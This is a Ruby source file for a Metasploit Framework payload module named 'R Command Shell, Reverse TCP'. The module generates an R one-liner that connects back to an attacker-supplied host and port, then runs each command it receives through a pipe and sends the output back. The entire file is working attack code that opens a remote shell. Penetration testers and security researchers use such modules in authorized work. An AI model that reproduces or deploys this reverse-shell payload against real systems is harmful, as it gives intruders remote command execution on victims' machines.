##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/payload/r'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 150

  include Msf::Payload::Single
  include Msf::Payload::R
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'R Command Shell, Reverse TCP',
      'Description' => 'Connect back and create a command shell via R',
      'Author'      => [ 'RageLtMan' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'r',
      'Arch'        => ARCH_R,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Session'     => Msf::Sessions::CommandShell,
      'PayloadType' => 'r',
      'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
    ))
  end

  def generate
    return prepends(r_string)
  end

  def r_string
    lhost = datastore['LHOST']
    lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
    return "s<-socketConnection(host='#{lhost}',port=#{datastore['LPORT']}," +
    "blocking=TRUE,server=FALSE,open='r+');while(TRUE){writeLines(readLines" +
    "(pipe(readLines(s, 1))),s)}"
  end
end
